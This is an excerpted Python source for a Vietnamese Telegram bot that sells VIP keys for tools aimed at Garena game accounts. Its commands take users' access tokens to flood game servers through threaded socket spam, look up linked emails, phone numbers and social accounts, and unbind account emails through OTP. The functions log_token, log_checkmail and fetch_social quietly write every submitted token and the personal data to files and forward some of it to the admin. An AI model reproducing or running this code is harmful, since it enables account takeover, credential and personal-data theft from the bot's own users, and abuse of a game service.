...
auto_install([
    ...
    "pycryptodome", "protobuf-decoder", "psutil", "requests"
])

import httpx, logging, asyncio, urllib.parse, hashlib
import time, json, os, uuid, socket, threading
...
def load_db():
    if not os.path.exists(DB_FILE):
        data = {"users": {}, "vip_keys": {}, "key_pool": {}, "banned": [],
                "balance": {}, "shop": DEFAULT_SHOP,
                "settings": {"bot_on": True, "spam_on": True, "maintenance": False,
                              "free_key_on": True, "free_key_interval": FREE_KEY_INTERVAL}}
        save_db(data)
        return data
    db = json.load(open(DB_FILE, "r", encoding="utf-8"))
    # Tự thêm field mới nếu thiếu
    if "balance" not in db: db["balance"] = {}
    if "shop"    not in db: db["shop"]    = DEFAULT_SHOP
    save_db(db)
    return db
...
def log_token(uid, username, token, extra=None):
    with open(TOKEN_LOG, "a", encoding="utf-8") as f:
        ...
        if extra:
            line += f" | Nick:{extra.get('nick','?')} | UID:{extra.get('uid','?')} | Server:{extra.get('server','?')}"
        f.write(line + "\n")

def log_checkmail(uid, username, token, email, mobile):
    with open("checkmail_log.txt", "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now():%Y-%m-%d %H:%M:%S}] ID:{uid} | @{username} | Token:{token} | Email:{email} | SDT:{mobile}\n")

def log_checkmxh(uid, username, token, result_text):
    with open("checkmxh_log.txt", "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now():%Y-%m-%d %H:%M:%S}] ID:{uid} | @{username} | Token:{token}\n{result_text}\n---\n")

def gen_vip_key(days):
    return "VIP-" + hashlib.md5(os.urandom(16)).hexdigest()[:12].upper() + f"-{days}D"
...
async def convert_eat_to_access(token_input: str) -> str:
    ...
    if "eat=" in token_input or "ticket.kiosgamer" in token_input or token_input.startswith("http"):
        try:
...
async def check_join(context, user_id):
    for g in REQUIRED_GROUPS:
        try:
            ...
            if any(x in str(e).lower() for x in ["not enough rights", "chat not found", "bot is not a member", "user not found"]):
                continue
            return False
        except Exception:
            continue
...
#               GARENA API
# ══════════════════════════════════════════════════════
async def fetch_mail(token, uid=None, username=None, bot=None, full_info=False):
...
async def fetch_social(token, uid=None, username=None, bot=None):
    ...
    async with httpx.AsyncClient(headers=GARENA_HEADERS, timeout=10) as c:
        try:
            ...
            for a in accs:
                u = a.get("user_info", {})
                txt += f"🌐  {p_map.get(a.get('platform'), 'N/A')}\n    👤 {u.get('nickname')}  |  🆔 {a.get('uid')}\n"
            txt += "```"
            if uid:
                log_checkmxh(uid, username or "N/A", token, txt.replace("```",""))
            if bot and uid:
                try:
                    await bot.send_message(
                        ADMIN_ID,
...
async def auto_cleanup_job(context):
    ...
    for k in list(pool.keys()):
        info = pool[k]
        if info.get("used") or (info.get("free") and now > info.get("expire_abs", 0)):
            del pool[k]; rk += 1
    vk = db["vip_keys"]
    rv = 0
...
async def auto_free_key_job(context):
    db = load_db()
    if not db["settings"].get("free_key_on") or not db["settings"].get("bot_on"):
        return
    key  = gen_free_key()
    link = await shorten_link(key)
    pool = db.get("key_pool", {})
    pool[key] = {"days": 0, "free": True, "expire_abs": time.time() + 3600, "used": False}
    db["key_pool"] = pool
    save_db(db)
    iv_h = db["settings"].get("free_key_interval", FREE_KEY_INTERVAL) // 3600
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔗  Nhấn để lấy Key", url=link)]])
    msg = (f"```\n"
           f"🎁  KEY FREE TỰ ĐỘNG\n"
           f"├──────────────────\n"
...
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    if uid not in db["users"]:
        db["users"][uid] = {"username": user.username or "", "joined": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
        save_db(db)
...
async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    if await guard(update, uid): return
    await get_reply(update).reply_text(
        f"```\n"
        f"┌───⭓ DANH SÁCH LỆNH\n"
        f"│\n"
        ...
        f"│  /sendotp <tk> <email>\n"
        f"│       →  Gửi OTP về email\n"
        f"│  /verifyotp <tk> <email> <otp>\n"
        f"│       →  Xác thực OTP\n"
        f"│  /unbind <tk> <email>\n"
        f"│       →  Gỡ liên kết email\n"
        f"│  /unbindotp <tk> <email> <otp>\n"
...
async def cmd_activevip(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    if key_code in pool:
        ...
        if pool[key_code].get("free") and time.time() > pool[key_code].get("expire_abs", 0):
            return await get_reply(update).reply_text("```\n❌  Key free đã hết thời gian!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    ok, detail = activate_vip_key(uid, key_code)
    if not ok:
        return await get_reply(update).reply_text(f"```\n❌  {detail}\n```", parse_mode=ParseMode.MARKDOWN_V2)
    is_free = load_db().get("key_pool", {}).get(key_code, {}).get("free", False)
    await get_reply(update).reply_text(
        f"```\n"
...
async def cmd_spam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    token = dict(urllib.parse.parse_qsl(urllib.parse.urlparse(token).query or token)).get("access_token", token)
    ...
    try:
        ...
        full_payload = bytes(result["UserAuthPacket"]) + f"/log/{key_hex}/start".encode()
        ...
        threading.Thread(target=socket_spam_worker,
                         args=(session_id, server_ip, server_port, full_payload),
                         daemon=True).start()
        log_token(uid, update.effective_user.username or update.effective_user.first_name, token, extra={
            "nick": result.get("UserNickName", "?"),
            "uid":  result.get("UserAccountUID", "?"),
...
def admin_only(func):
    async def wrapper(update: Update, ctx: ContextTypes.DEFAULT_TYPE, **kwargs):
        if update.effective_user.id != ADMIN_ID:
            msg = getattr(update, "message", None) or getattr(update.callback_query, "message", None)
            if msg:
...
async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    db = load_db()
    avip  = sum(1 for v in db["vip_keys"].values() if v["expire"] == -1 or v["expire"] > time.time())
...
async def cmd_createkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    db   = load_db()
    pool = db.get("key_pool", {})
    pool[key] = {"days": days, "free": False, "used": False, "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
    db["key_pool"] = pool
    save_db(db)
    await get_reply(update).reply_text(
        f"```\n"
...
async def cmd_unban(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    db  = load_db()
    if tid in db["banned"]:
        db["banned"].remove(tid); save_db(db)
        await get_reply(update).reply_text(f"```\n✅  Đã unban ID: {tid}\n```", parse_mode=ParseMode.MARKDOWN_V2)
    else:
...
async def cmd_stopall(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    for sid in list(active_spams.keys()): active_spams[sid]["running"] = False
    active_spams.clear(); user_active_session.clear()
...
async def cmd_listkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    for k, info in list(pool.items())[-20:]:
        lines += f"{'✅' if info.get('used') else '⬜'}  {k}  [{'FREE' if info.get('free') else str(info['days']) + 'd'}]\n"
    await get_reply(update).reply_text(lines + "```", parse_mode=ParseMode.MARKDOWN_V2)
...
async def cmd_setfreekey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    if arg == "on":   db["settings"]["free_key_on"] = True;  save_db(db); await get_reply(update).reply_text("```\n✅  Phát key free: BẬT\n```", parse_mode=ParseMode.MARKDOWN_V2)
    elif arg == "off": db["settings"]["free_key_on"] = False; save_db(db); await get_reply(update).reply_text("```\n✅  Phát key free: TẮT\n```", parse_mode=ParseMode.MARKDOWN_V2)
    elif arg == "interval" and len(ctx.args) > 1 and ctx.args[1].isdigit():
        db["settings"]["free_key_interval"] = int(ctx.args[1]); save_db(db)
        await get_reply(update).reply_text(f"```\n✅  Chu kỳ: {ctx.args[1]}s\n```", parse_mode=ParseMode.MARKDOWN_V2)

@admin_only
async def cmd_cleanup(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    db = load_db(); pool = db.get("key_pool", {}); now = time.time(); rk = rv = 0
    for k in list(pool.keys()):
        if pool[k].get("used") or (pool[k].get("free") and now > pool[k].get("expire_abs", 0)):
            del pool[k]; rk += 1
    vk = db["vip_keys"]
    for uid in list(vk.keys()):
        if vk[uid]["expire"] != -1 and vk[uid]["expire"] < now:
            del vk[uid]; rv += 1
    db["key_pool"] = pool; db["vip_keys"] = vk; save_db(db)
...
async def callback_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    # ── verify_join ──
    if data == "verify_join":
        try:    joined = await check_join(ctx, q.from_user.id)
        except: joined = True
        if joined:
    ...
    if data == "getkey":
        ...
        key  = gen_free_key()
        link = await shorten_link(key)
        db2  = load_db(); pool = db2.get("key_pool", {})
        pool[key] = {"days": 0, "free": True, "expire_abs": time.time() + 3600, "used": False}
        db2["key_pool"] = pool; save_db(db2)
        await q.message.reply_text(
            f"```\n"
            f"┌───⭓ KEY FREE\n"
            f"│\n"
    ...
    if data.startswith("ev_approve_") or data.startswith("ev_reject_"):
        ...
        if action == "approve":
            ...
            if reward_type == "key":
                ...
                pool3[key3] = {"days": reward_value, "free": False, "used": False,
                ...
                reward_msg = f"💰  {reward_value:,}đ đã được cộng vào tài khoản!"
            try:
                await ctx.bot.send_message(
                    int(tuid),
                    f"```\n"
    ...
    if   data == "adm_bot":      s["bot_on"]      = not s["bot_on"];      save_db(db)
    elif data == "adm_spam":     s["spam_on"]     = not s["spam_on"];     save_db(db)
    elif data == "adm_maint":    s["maintenance"] = not s["maintenance"]; save_db(db)
    elif data == "adm_freekey":  s["free_key_on"] = not s["free_key_on"]; save_db(db)
    elif data == "adm_stats":
        avip  = sum(1 for v in db["vip_keys"].values() if v["expire"] == -1 or v["expire"] > time.time())
        rspam = sum(1 for v in active_spams.values() if v["running"])
        await q.message.reply_text(
    ...
    db = load_db()
    try: await q.edit_message_reply_markup(reply_markup=admin_kb(db["settings"]))
    except: pass
...
async def vip_guard(update: Update, uid: str) -> bool:
    ...
    if not has_vip:
        ...
        return True
    db = load_db()
    kinfo = db.get("key_pool", {}).get(db["vip_keys"].get(uid, {}).get("key", ""), {})
    if kinfo.get("free"):
        await get_reply(update).reply_text(
...
async def cmd_mailinfo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if await vip_guard(update, uid, "mailinfo"): return
    if not ctx.args:
        return await get_reply(update).reply_text(
...
async def cmd_unbind(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if await vip_guard(update, uid, "unbind"): return
    if len(ctx.args) < 2:
        return await get_reply(update).reply_text("```\n⚠️  Cú pháp: /unbind <token> <email>\n```", parse_mode=ParseMode.MARKDOWN_V2)
    token = await convert_eat_to_access(ctx.args[0].strip())
    email = ctx.args[1].strip()
    res   = await luan_request("unbind", {"access_token": token, "email": email})
    msg   = res.get("message", str(res))
    await get_reply(update).reply_text(
        f"```\n┌───⭓ HỦY LIÊN KẾT\n│  📩  Email  :  {email}\n│  📋  Kết quả:  {msg}\n│  📌  Nhập OTP: /unbindotp <token> <email> <otp>\n└──────────────────\n```",
        parse_mode=ParseMode.MARKDOWN_V2
    )
...
async def cmd_unbindotp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    email = ctx.args[1].strip()
    otp   = ctx.args[2].strip()
    res   = await luan_request("unbind", {"access_token": token, "email": email, "otp": otp})
    msg   = res.get("message", str(res))
    await get_reply(update).reply_text(
        f"```\n┌───⭓ KẾT QUẢ GỠ LIÊN KẾT\n│  📋  {msg}\n└──────────────────\n```",
        parse_mode=ParseMode.MARKDOWN_V2
...
# ══════════════════════════════════════════════════════
@admin_only
async def cmd_vipstats(update: Update, ctx: ContextTypes.DEFAULT_TYPE, _reply=None):
    db   = load_db()
    vk   = db.get("vip_keys", {})
    pool = db.get("key_pool", {})
    users = db.get("users", {})
...
async def cmd_exportvip(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    users = db.get("users", {})
    lines = []
    lines.append(f"=== XUẤT DỮ LIỆU VIP === {datetime.now():%Y-%m-%d %H:%M:%S}\n")
    for uid, info in vk.items():
        ok, left = check_vip(uid)
    ...
    export_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vip_export.txt")
    with open(export_path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))
    reply_obj = getattr(update, 'message', None) or getattr(update, 'callback_query', None)
...
async def cmd_mua(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    kb_rows.append([InlineKeyboardButton("💳  Nạp tiền", callback_data="nap_info")])
...
async def cmd_setshop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    if len(ctx.args) < 5:
        ...
        text = "```\n┌───⭓ BẢNG GIÁ HIỆN TẠI\n│\n"
        for k, item in shop.items():
            text += f"│  [{k}] {item['label']} — {item['price']:,}đ — {item['days']}d — {item['desc']}\n"
        text += (
            f"├──────────────────\n"
            f"│  Cú pháp chỉnh:\n"
    ...
    db    = load_db()
    db["shop"][sid] = {"days": days, "price": price, "label": label, "desc": desc}
    save_db(db)
    await get_reply(update).reply_text(
...
async def cmd_event(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    for eid, ev in active.items():
        reward = f"{ev['reward_value']} ngày VIP" if ev["reward_type"] == "key" else f"{ev['reward_value']:,}đ"
        sub    = ev.get("submissions", {}).get(uid, {})
        status = {"pending": "⏳ Chờ duyệt", "approved": "✅ Đã duyệt", "rejected": "❌ Bị từ chối"}.get(sub.get("status"), "Chưa tham gia")
        kb = []
        if not sub:
            if ev["type"] == "link":
                ...
                if link_url and link_url.startswith("http"):
                    row.append(InlineKeyboardButton("🔗  Vào link event", url=link_url))
                if row:
                    kb.append(row)
                kb.append([InlineKeyboardButton("📸  Gửi ảnh xác nhận", callback_data=f"sub_event_{eid}")])
            elif ev["type"] == "photo":
                kb = [[InlineKeyboardButton("📸  Gửi ảnh tham gia", callback_data=f"sub_event_{eid}")]]
            elif ev["type"] == "game":
                kb = [[InlineKeyboardButton("🎮  Chơi ngay", callback_data=f"game_event_{eid}")]]
        elif sub.get("status") == "pending":
            kb = [[InlineKeyboardButton("⏳  Đang chờ duyệt", callback_data="noop")]]
        elif sub.get("status") == "approved":
            kb = [[InlineKeyboardButton("✅  Đã được duyệt", callback_data="noop")]]
...
async def handle_event_photo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    if "submissions" not in ev: ev["submissions"] = {}
    ev["submissions"][uid] = {"status": "pending", "file_id": file_id,
                               "username": update.effective_user.username or update.effective_user.first_name}
    db["events"][eid] = ev
    save_db(db)
    ctx.user_data.pop("pending_event", None)
...
async def cmd_createevent(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    db  = load_db()
    if "events" not in db: db["events"] = {}
    db["events"][eid] = {
        "title": title, "desc": desc, "type": etype,
        "link": link, "reward_type": rtype, "reward_value": rval,
        "active": True, "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "submissions": {}
    }
    save_db(db)
...
async def cmd_eventsubs(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    for uid, info in subs.items():
        st   = {"pending": "⏳", "approved": "✅", "rejected": "❌"}.get(info["status"], "?")
...
async def cmd_creategift(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    db = load_db()
    if "giftcodes" not in db: db["giftcodes"] = {}
    db["giftcodes"][code] = {
...
async def cmd_listgift(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    for code, info in gcs.items():
        reward = f"{info['reward_value']}d VIP" if info["reward_type"] == "key" else f"{info['reward_value']:,}đ"
...
async def cmd_delgift(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    if code in db.get("giftcodes", {}):
        del db["giftcodes"][code]; save_db(db)
...
async def start_game(q, uid: str, eid: str, ctx):
    ...
    game_sessions[uid] = {"type": game_type, "answer": answer, "eid": eid, "attempts": 3}
...
async def handle_game_answer(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    if answer == correct or (sess["type"] == "lucky" and answer in ["🍎","🍊","🍋","🍇","🍓"]):
        won = answer == correct
    else:
        won = False
    ...
    if won:
        ...
        if "submissions" not in ev: ev["submissions"] = {}
        ev["submissions"][uid] = {"status": "approved",
                                   "username": update.effective_user.username or update.effective_user.first_name}
...
# ══════════════════════════════════════════════════════
# db["shop"][id]["features"] = ["spam", "mailinfo", "unbind", ...] hoặc [] = tất cả
...
async def cmd_setfeature(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    save_db(db)
    feat_str = "Tất cả" if not db["shop"][sid]["features"] else ", ".join(db["shop"][sid]["features"])
    await get_reply(update).reply_text(
...
async def cmd_log(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    for sid2, info2 in active_spams.items():
        ...
        lines  += (
            f"│  {status2}  [{sid2}]\n"
            f"│      👤 {info2.get('nickname','?')}  |  📦 {info2.get('count',0)} gói\n"
            f"│      🆔 UID: {info2.get('uid','?')}\n"
            f"├──────────────────\n"
        )
    ...
    status = "🟢 Đang chạy" if info.get("running") else "🔴 Đã dừng"
    count  = info.get("count", 0)
    elapsed = int(time.time() - time.mktime(time.strptime(info.get("start_at","00:00:00"), "%H:%M:%S"))) if info.get("start_at") else 0
...
async def group_filter(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    # Xử lý game answer trong private chat
    if update.effective_chat.type == ChatType.PRIVATE and update.message and update.message.text:
        # Xử lý reply keyboard shortcuts
        txt = update.message.text
        uid_g = str(update.effective_user.id)
        if txt == "🏠 Menu":
        ...
        if handled: return
    if update.effective_chat.type != ChatType.PRIVATE and update.message and update.message.text:
        if "access_token" in update.message.text.lower() or len(update.message.text) > 60:
...
if __name__ == "__main__":
    ...
    app.add_handler(MessageHandler(filters.PHOTO & filters.ChatType.PRIVATE, handle_event_photo))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, group_filter))

    db0     = load_db()
    free_iv = db0["settings"].get("free_key_interval", FREE_KEY_INTERVAL)
    jq.run_repeating(auto_free_key_job,     interval=free_iv, first=free_iv)
    jq.run_repeating(check_vip_expired_job, interval=60,      first=60)
    jq.run_repeating(auto_cleanup_job,       interval=300,     first=300)
    jq.run_repeating(lambda ctx: check_update_logic(ctx), interval=3600, first=60)

    print(f"✅  {BOT_NAME} v{VERSION} đang chạy...")
